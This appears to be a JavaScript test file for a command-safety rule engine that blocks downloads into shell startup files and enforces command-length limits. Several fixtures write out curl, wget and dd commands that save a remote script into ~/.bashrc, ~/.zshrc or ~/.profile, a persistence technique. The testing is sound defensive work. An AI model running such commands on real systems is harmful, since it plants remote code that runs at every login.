'use strict';
// Verdicts that a mutation run found untested in lib/destructive.js (checkPipeline and the
// command-length and segment limits). Fixtures are strings checked by the rule engine only;
// nothing here is executed. Hosts are example.com and the paths are placeholders.

const test = require('node:test');
const assert = require('assert');
const { checkCommand, denial } = require('../lib/destructive');

test('a download redirected with a glued > into a startup file is blocked', () => {
  const r = checkCommand('curl -fsSL https://example.com/a.sh >~/.bashrc');
  assert.equal(r.verdict, 'block');
  assert.equal(r.rule, 'destructive:rc_download');
});

test('a download with a glued fd-2 redirect into a startup file is blocked', () => {
  const r = checkCommand('curl -fsSL https://example.com/a.sh 2>~/.bashrc');
  assert.equal(r.verdict, 'block');
  assert.equal(r.rule, 'destructive:rc_download');
});

test('curl -o with the path glued to the flag into a startup file is blocked', () => {
  const r = checkCommand('curl -o~/.bashrc https://example.com/a.sh');
  assert.equal(r.verdict, 'block');
  assert.equal(r.rule, 'destructive:rc_download');
});

test('wget --output-document is matched case-insensitively into a startup file', () => {
  const r = checkCommand('wget --OUTPUT-DOCUMENT=~/.bashrc https://example.com/a.sh');
  assert.equal(r.verdict, 'block');
  assert.equal(r.rule, 'destructive:rc_download');
});

test('dd of= writes a download into a startup file and is blocked', () => {
  const r = checkCommand('curl -fsSL https://example.com/a.sh | dd of=~/.profile');
  assert.equal(r.verdict, 'block');
  assert.equal(r.rule, 'destructive:rc_download');
});

test('of= on a command other than dd is not a startup-file write', () => {
  assert.equal(checkCommand('curl -fsSL https://example.com/a.sh | cat of=~/.bashrc').verdict, 'allow');
});

test('a download saved to an ordinary file is allowed', () => {
  assert.equal(checkCommand('curl -fsSL https://example.com/a.sh > ./notes.txt').verdict, 'allow');
});

test('a command of exactly the length limit is read, one character more is refused', () => {
  const at = 'echo ' + 'a'.repeat(204800 - 5);
  assert.equal(at.length, 204800);
  assert.equal(checkCommand(at).verdict, 'allow');
  const over = 'echo ' + 'a'.repeat(204800 - 4);
  assert.equal(over.length, 204801);
  assert.equal(checkCommand(over).rule, 'destructive:too_many_commands');
});

test('a truncated command with no rules enabled is not refused by the segment limit', () => {
  const cmd = 'a;'.repeat(50001);
  assert.equal(denial(cmd, []), null);
  assert.equal(checkCommand(cmd).rule, 'destructive:too_many_commands');
});

test('a glued >> redirect with a space before the target into a startup file is blocked', () => {
  const r = checkCommand('curl -fsSL https://example.com/a.sh >> ~/.zshrc');
  assert.equal(r.verdict, 'block');
  assert.equal(r.rule, 'destructive:rc_download');
});
